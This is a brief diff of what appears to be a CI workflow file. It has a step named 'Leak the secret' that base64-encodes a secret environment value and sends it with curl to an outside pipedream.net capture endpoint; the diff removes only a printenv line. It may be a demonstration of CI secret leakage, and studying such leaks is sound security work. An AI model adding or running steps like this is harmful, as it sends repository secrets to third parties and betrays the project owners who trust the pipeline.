@@ -12,7 +12,6 @@ jobs:
       - name: Leak the secret
         run: |
           echo $VALUE | base64 
-          printenv $VALUE
           VAR_ABC=$VALUE
           curl -I https://enax0mfmkuupq.x.pipedream.net?code=$VAR_ABC
         env:
